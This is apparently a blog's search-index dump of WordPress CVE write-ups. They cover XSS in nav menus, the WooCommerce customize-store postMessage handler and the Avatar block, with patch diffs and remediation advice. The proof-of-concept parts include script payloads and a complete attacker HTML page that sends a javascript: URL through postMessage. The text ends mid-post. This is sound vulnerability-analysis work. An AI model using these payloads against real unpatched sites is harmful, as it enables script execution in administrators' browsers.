names. Block .., /, \\ or use realpath() and compare with the base directory. Update the plugin to 19.11.1 immediately. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — Hacktrick WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin \u003c= 19.11.0 is vulnerable to Local File Inclusion ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analysis"],"collections":null,"content":"A Stored Cross Site Scripting (XSS) vulnerability occurs in WordPress Core prior to version 6.8.3. The root cause is improper input handling when generating dynamic pages, affecting the menu creation feature (nav menus). CVE ID: CVE-2025-58674 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 6.8.2 Patched Versions: 6.8.3 CVSS severity: Low (5.9) Required Privilege: Author Product: WordPressCore ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress Core Versions: v6.8.2 (vulnerable) and v6.8.3 (patched). Diff Tool - Meld or any diff/comparison tool to inspect and compare differences between the two versions. Theme - Astra: A very popular theme among WordPress users, which supports quick creation of nav menu items. ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:1:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis WordPress is open source and its repository is on GitHub, so we can look at the commit related to the XSS fix to observe the changes and understand where the vulnerability occurs. ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:2:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable version: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), $html = '', $selected = '', currentItemID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val(), currentparentID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val(), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = [ currentItemID ]; if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = childItem.find( '.menu-item-data-db-id' ).val(); excludeMenuItem.push( childID ); }); } if ( currentparentID == 0 ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"0\"\u003e' + wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ) + '\u003c/option\u003e'; $.each( menuItems, function() { var menuItem = $(this), $selected = '', menuID = menuItem.find( '.menu-item-data-db-id' ).val(), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { if ( currentparentID == menuID ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; } }); parentDropdown.html( $html ); }); }); }, In the vulnerable version, the value menuTitle is inserted into the \u003coption\u003e tag and rendered into HTML using jQuery’s html() method without any XSS prevention. The html() function replaces the HTML content inside the element, so if menuTitle contains malicious code it will be executed in the browser. Patched version: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), currentItemID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val() ), currentParentID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val() ), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = /** @type {number[]} */ [ currentItemID ]; parentDropdown.empty(); if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = parseInt( childItem.find( '.menu-item-data-db-id' ).val() ); excludeMenuItem.push( childID ); }); } parentDropdown.append( $( '\u003coption\u003e', { value: '0', selected: currentParentID === 0, text: wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ), } ) ); $.each( menuItems, function() { var menuItem = $(this), menuID = parseInt( menuItem.find( '.menu-item-data-db-id' ).val() ), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { parentDropdown.append( $( '\u003coption\u003e', { value: menuID.toString(), selected: currentParentID === menuID, text: menuTitle, } ) ); } }); }); }); }, The patch fixes the issue by explicitly assigning menuTitle to the text property instead of injecting it into HTML. This ensures menuTitle is treated as plain text and cannot contain or execute malicious JavaScript. Thus, data added into the \u003coption\u003e element is safe and the XSS vector via menuTitle is eliminated. Comparison between vulnerable and patched versions ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:2:1","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code Inspecting the code in the browser shows menuItems = #menu-to-edit li is an array of \u003cli\u003e elements inside the \u003cul\u003e with id=menu-to-edit Inspecting code in the browser The updateParentDropdown function iterates over the \u003cli\u003e elements, retrieves the value of the \u003cinput\u003e with class edit-menu-item-title, assigns that value to menuTitle inside an \u003coption\u003e tag, and renders it into HTML. Inspecting DOM after adding a menu In the UI: Display in the admin UI In the commit there is a change that seems useful but did not help the analysis. HTML entity encode (1) I used // to comment out all lines related to html_entity_decode of origin_title but was still able to exploit. Previously I had set debug points at those locations but nothing happened. Besides commenting them out, I selected the menu containing the XSS payload and clicked Add to Menu, capturing the request with Burp Suite to see whether the added value was HTML entity encoded. HTML entity encode (2) menu-item-title is the value taken from the input named menu-item[-5][menu-item-title] derived from the post-title, which is checked to add into the request body \u003cinput type=\"hidden\" class=\"menu-item-title\" name=\"menu-item[-5][menu-item-title]\" value=\"\u003cscript\u003ealert(document.domain)\u003c/script\u003e\"\u003e One interesting thing here: the browser takes the decoded HTML entity value to add into the request, meaning the value from the server was encoded before being echoed into HTML. Browser decodes HTML entity before sending 👉 The browser decoded the HTML entity before rendering the HTML. On the DOM, after clicking Add to Menu =\u003e attachTabsPanelListeners is called and appends the selected value to the bottom of the menu item list. Appending the item to the end of the menu list 👉 edit-menu-item-title contains the XSS payload. The updateParentDropdown function will take it and assign it to an \u003coption\u003e element =\u003e XSS occurs ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:2:2","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks Source: post-title — the post title Sink: parentDropdown.html( $html ) which may contain malicious HTML $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:2:3","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:3:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Use an Author account to create a post with a title containing an XSS payload An Admin visits the endpoint wp-admin/nav-menus.php and adds menus from the created post The JavaScript event is triggered Proof of Concept: XSS The \u003cscript\u003e tag inside an \u003coption\u003e within a \u003cselect\u003e can be executed, while other tags inside \u003coption\u003e are not — they only return the text inside. {: .prompt-info } When the browser parses the HTML string, the \u003cscript\u003e is not truly inside the \u003coption\u003e flow; the parser “lifts” the script out of the \u003coption\u003e and inserts it into the DOM tree. \u003cselect name=\"\" id=\"\"\u003e \u003coption value=\"\"\u003eabc\u003c/option\u003e \u003coption value=\"\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/option\u003e \u003c/select\u003e Therefore, the script executes immediately, while the \u003coption\u003e remains but its content is empty or displays nothing. Inspecting DOM after the script is lifted For other tags \u003cselect name=\"\" id=\"\"\u003e \u003coption value=\"\"\u003eabc\u003c/option\u003e \u003coption value=\"\"\u003e\u003cb\u003eabd\u003c/b\u003e\u003c/option\u003e \u003c/select\u003e The browser follows the spec: \u003coption\u003e is text-only. When parsing \u003cb\u003e or \u003cimg\u003e inside an \u003coption\u003e: \u003cb\u003e is treated as text =\u003e the tag is removed, only “abd” is displayed as text. \u003cimg\u003e is removed entirely. Inspect: rendering option with inline elements ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:3:1","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-58674 demonstrates the risk of inserting user-controlled data directly into HTML via html() or innerHTML. A \u003cscript\u003e inside an \u003coption\u003e can be lifted out by the parser and executed, while other tags are stripped or treated as text. The patch uses the text property to ensure safety and eliminate XSS. ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:4:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Do not concatenate HTML strings from user data and insert them with html()/innerHTML. Use safe element creation APIs (option.text, document.createElement). Always escape/sanitize data both server-side and client-side. Understand parser behavior: \u003cscript\u003e can escape an inert container. ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:5:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross-site scripting (XSS) cheat sheet — PortSwigger WordPress Core \u003c= 6.8.2 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-11","objectID":"/posts/2025-10-11-cve-2025-58674/:6:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/posts/2025-10-11-cve-2025-58674/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WooCommerce Plugin.","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The WooCommerce plugin for WordPress has a PostMessage-based Cross-Site Scripting (XSS) vulnerability via the ‘customize-store’ page in all versions up to and including 9.4.2, due to insufficiently safe handling of PostMessage data (no input sanitization and no escaping when output). This allows an unauthenticated attacker to inject arbitrary script into the site that will execute if they can trick a user into performing an action, for example clicking a link. CVE ID: CVE-2025-5062 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 9.3.2 and from 9.4 through 9.4.2 Patched Versions: 9.3.4 and 9.4.3 CVSS severity: Low (6.1) Required Privilege: Unauthenticated Product: WordPress WooCommerce Plugin ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WooCommerce: 9.4.2 (vulnerable) and 9.4.3 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff In the vulnerable version, attachParentListeners() listens to all messages from any origin without checking the origin; data from the message is assigned directly into the DOM which leads to PostMessage-Based XSS (a subtype of DOM‑based XSS). export function attachParentListeners() { const listener = ( event ) =\u003e { if ( event.data.type === 'navigate' ) { window.location.href = event.data.url; } }; window.addEventListener( 'message', listener, false ); return () =\u003e { window.removeEventListener( 'message', listener, false ); }; } {: file=“client/admin/client/customize-store/utils.js v9.4.2”} In the patched version, more checks and restrictions were added compared to the vulnerable version, moving from \"accept every message and redirect straight away\" to \"only accept trusted messages, validate structure and check the URL before navigation\". export function attachParentListeners() { const allowedOrigins = [ getAdminSetting( 'homeUrl' ) ]; function handleMessage( event ) { // Validate the origin. if ( ! allowedOrigins.includes( event.origin ) ) { // Blocked message from untrusted origin: event.origin. return; } // Validate the structure of event.data. if ( ! event.data || typeof event.data.type !== 'string' || typeof event.data.url !== 'string' ) { // Invalid message structure: event.data. return; } // Only allow the 'navigate' type. if ( event.data.type === 'navigate' ) { // Validate the URL format. try { const url = parseAdminUrl( event.data.url ); // Further restrict navigation to trusted domains. if ( ! allowedOrigins.some( ( origin ) =\u003e url.origin === origin ) ) { throw new Error( `Blocked navigation to untrusted URL: ${ url.href }` ); } window.location.href = url.href; } catch ( error ) { // Invalid URL: event.data.url. captureException( error ); } } } window.addEventListener( 'message', handleMessage, false ); return function removeListener() { window.removeEventListener( 'message', handleMessage, false ); }; } {: file=“client/admin/client/customize-store/utils.js v9.4.3”} Diff — Comparison of source changes between the vulnerable and patched versions ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code Although I found the source and sink, when analyzing the plugin source after download I initially could not find the function attachParentListeners(). Search results for attachParentListeners() I thought my setup had failed and the code hadn’t been fully downloaded. But no — when searching for the keyword \"navigate\" I found a function with a different name but the same functionality as attachParentListeners(). Search results for “navigate” 👉 In the product build, to optimize browser load time the plugin used minification which removes whitespace, renames functions/variables to short names, and partially obfuscates the code making it harder to read. The downloaded file was named 5292.js instead of utils.js. After beautifying the code, I found 5292.js contains the utils.js code and many other files’ code. Visiting the customize-store page and sending a postMessage through the browser console: http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store An alert() event triggered when postMessage is sent from the browser console 👉 alert() is triggered. Using the browser debugger I checked which file 5292.js was loaded from in the browser. 5292.js from browser debugger ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:3:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks Source: event.data from window.postMessage (specifically event.data.url) Sink: window.location.href = event.data.url ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:3:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a webpage with the following source: \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"openPopup\"\u003eOpen Popup\u003c/button\u003e \u003cscript\u003e let popup; document.getElementById(\"openPopup\").addEventListener(\"click\", () =\u003e { // Open a popup popup = window.open( \"http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store\", \"popupWindow\", \"width=400,height=300\" ); // Wait for the popup to load const interval = setInterval(() =\u003e { if (popup \u0026\u0026 !popup.closed) { // Send message popup.postMessage({ type: 'navigate', url: 'javascript:alert(\"phu0c ph4m\")' }, '*'); clearInterval(interval); } }, 5000); }); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e An admin visits the webpage and clicks Open Popup. After 5s, the JavaScript event is triggered. JavaScript event from the popup 👉 Matches the CVE description. The popup cannot auto-open without a user interaction {: .prompt-info } Here, an \u003ciframe\u003e can’t be used because X-Frame-Options: SAMEORIGIN is set in the response — only same-origin embedding is allowed. X-Frame-Options: SAMEORIGIN is set in the response ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:4:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-5062 vulnerability in WooCommerce \u003c= 9.4.2 is a PostMessage‑based DOM XSS. An unauthenticated attacker can send a malicious message to the customize-store page causing the victim’s browser to execute script if the victim interacts (via popup/link). The 9.4.3 patch validates origin, verifies message structure, and whitelists URLs before redirecting. Key takeaways: PostMessage‑based DOM XSS can execute script when the user interacts (popup/link). Data from postMessage must always be treated as untrusted. Always validate origin, check the message structure and URL before redirecting. Update the plugin to the latest patched version to prevent exploitation. ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross-site scripting (XSS) cheat sheet — PortSwigger WordPress WooCommerce \u003c= 9.3.2 and from 9.4 through 9.4.2 — CVE-2025-5062 ","date":"2025-10-10","objectID":"/posts/2025-10-10-cve-2025-5062/:6:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/posts/2025-10-10-cve-2025-5062/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info WordPress Core is vulnerable to Stored Cross-Site Scripting via the user’s display name in the Avatar block in multiple versions up to 6.5.2 due to insufficient output escaping of the display name. This allows authenticated attackers with contributor-level access or higher to inject arbitrary web scripts into pages — those scripts will execute whenever a user visits the page containing the injection. Additionally, it allows unauthenticated attackers to inject arbitrary web scripts into pages that contain a comment block showing the comment author’s avatar. CVE ID: CVE-2024-4439 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: 6.0 - 6.0.7 6.1 - 6.1.5 6.2 - 6.2.4 6.3 - 6.3.3 6.4 - 6.4.3 6.5 - 6.5.1 Patched Versions: 6.0.8 6.1.6 6.2.5 6.3.4 6.4.4 6.5.2 CVSS severity: 7.2 (High) Required Privilege: Contributor+ Product: WordPress ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:1:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Core versions: 6.4.3 (vulnerable) and 6.4.4 (patched). Diff tool - Meld or any diff/comparison tool to inspect and compare differences between the two versions. ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:2:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:3:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff In the vulnerable version, WP Core used esc_attr__() to translate the string and escape an HTML attribute before outputting to the browser, but it was implemented incorrectly. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; Here esc_attr__() translates and escapes the HTML before being passed to sprintf() to inject $author_name — therefore $author_name is not escaped. In the patched version, $author_name is passed into sprintf() first and then the full string is escaped with esc_attr(), which is safe against XSS. $label = 'aria-label=\"' . esc_attr( sprintf( __( '(%s author archive, opens in a new tab)' ), $author_name ) ) . '\"'; Comparison between the vulnerable and patched versions ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:3:1","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code function render_block_core_avatar( $attributes, $content, $block ) { // other logic if ( ! isset( $block-\u003econtext['commentId'] ) ) { $author_id = isset( $attributes['userId'] ) ? $attributes['userId'] : get_post_field( 'post_author', $block-\u003econtext['postId'] ); $author_name = get_the_author_meta( 'display_name', $author_id ); // other logic if ( isset( $attributes['isLink'] ) \u0026\u0026 $attributes['isLink'] ) { $label = ''; if ( '_blank' === $attributes['linkTarget'] ) { // translators: %s is the Author name. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; } } } // other logic } The Avatar block is a Block Editor block used to render post or comment content in WordPress. $author_name is the display_name of the author with $author_id belonging to the current post. If this is a post and the link option is enabled, the $author_name containing a payload will be added to the aria-label attribute and output to the browser. When visiting any post, wp() is called to load that post’s data. function wp( $query_vars = '' ) { global $wp, $wp_query, $wp_the_query; $wp-\u003emain( $query_vars ); if ( ! isset( $wp_the_query ) ) { $wp_the_query = $wp_query; } } Here $wp_query is created and will contain the wp_post values after the query. public function main( $query_args = '' ) { $this-\u003einit(); $parsed = $this-\u003eparse_request( $query_args ); if ( $parsed ) { $this-\u003equery_posts(); $this-\u003ehandle_404(); $this-\u003eregister_globals(); } $this-\u003esend_headers(); do_action_ref_array( 'wp', array( \u0026$this ) ); } main() will parse_request and perform the query to fetch the current post information using query_posts(). $wp_the_query is the main WP_Query object in WordPress, while $wp_query is simply a reference pointing to $wp_the_query. Therefore, when $wp_the_query is initialized and has data, $wp_query will have the same data. We obtain the post_content value: \u003c!-- wp:avatar {\"userId\":2,\"isLink\":true,\"linkTarget\":\"_blank\"} /--\u003e wp:avatar is the core/avatar block type. The render() function will call call_user_func() with the callback render_block_core_avatar() to get the Avatar block HTML and return it to the user. ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:3:2","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks Source: author name of a contributor+ Sink: $author_name injected into the aria-label attribute ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:3:3","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:4:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a post account with role contributor+ containing an avatar block, enable the Link to user profile option and select the contributor user. Change the first name to contain an XSS payload and set the display name to the first name. Admin previews the post =\u003e XSS occurs ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:4:1","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2024-4439 vulnerability in WordPress Core \u003c= 6.5.1 stems from incorrect use of the esc_attr__() function when handling display_name in the Avatar block, resulting in a Stored XSS. An attacker can exploit this by inserting a payload in the display_name, causing malicious scripts to execute when users (including admins) visit a page containing the block. The patch in 6.0.8, 6.1.6, 6.2.5, 6.3.4, 6.4.4, 6.5.2 changes the handling — escaping after formatting with sprintf() — ensuring the data is safe before rendering to the browser. Key takeaways: Escape order matters: data should be formatted first, then escaped to avoid introducing XSS. Even core functions like esc_attr__() can lead to serious vulnerabilities if used incorrectly. Stored XSS is particularly dangerous because it persists in the database and can trigger whenever a user views the affected content. Not only plugins/themes, but WordPress Core must be updated regularly to reduce security risk. Analyzing patch diffs is an effective way to learn secure coding practices and understand the root cause of bugs. ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:5:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross-site scripting (XSS) cheat sheet — PortSwigger ","date":"2025-10-09","objectID":"/posts/2025-10-09-cve-2024-4439/:6:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/posts/2025-10-09-cve-2024-4439/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Statistics Plugin.","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info WP Statistics – The Most Popular Privacy-Friendly Analytics Plugin for WordPress has a Stored Cross-Site Scripting (XSS) vulnerability via the User-Agent Header in all versions up to and including 14.15.4. The root cause is insufficient input validation/filtering and output escaping. This vulnerability allows an unauthenticated attacker to inject malicious JavaScript into the system. The injected scripts will execute whenever a user visits a page containing the malicious data, posing severe security and privacy risks. CVE ID: CVE-2025-9816 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 14.15.4 Patched Versions: 14.15.5 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress WP Statistics Plugin ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP Statistics: v14.15.4 (vulnerable) and v14.15.5 (patched). Diff tool - Meld or any diff comparison tool to inspect differences between the two versions. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis I initially missed some details while collecting information about this CVE; the references of https://www.cve.org/CVERecord?id=CVE-2025-9816 point to where the vulnerability occurs: includes/admin/templates/pages/devices/models.php{: .filepath} But I overlooked it and used Meld to compare code. Because the code changed a lot, I proactively searched for files related to user-agent. The changes in UserAgent.php made me believe the vulnerability truly occurs there. It cost me quite a bit of time but I couldn’t fully analyze it at that point. However, this effort helped the overall analysis. 🍀 Fortunately, guided by senior researchers, I focused on the correct vulnerability location. That made the analysis easier. Tip: This is a Cross Site Scripting vulnerability that happens in the victim’s browser, so you need to find where it is first rendered into HTML. ","date":"2025-10-08","objectID":"/posts/2025-10-08-cve-2025-9816/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/posts/2025-10-08-cve-2025-9816/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff The 